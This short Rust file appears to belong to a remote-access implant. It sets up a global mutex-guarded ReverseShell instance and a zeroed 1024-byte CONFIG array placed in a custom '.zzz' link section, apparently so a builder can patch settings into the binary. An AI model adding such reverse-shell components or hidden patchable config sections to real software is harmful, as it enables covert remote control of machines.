use std::sync::Mutex;
use once_cell::sync::Lazy;
use crate::features::reverse_shell::ReverseShell;

pub static REVERSE_SHELL: Lazy<Mutex<ReverseShell>> = Lazy::new(|| {
    Mutex::new(ReverseShell::new())
});

#[no_mangle]
#[link_section = ".zzz"]
pub static CONFIG: [u8; 1024] = [0; 1024]; 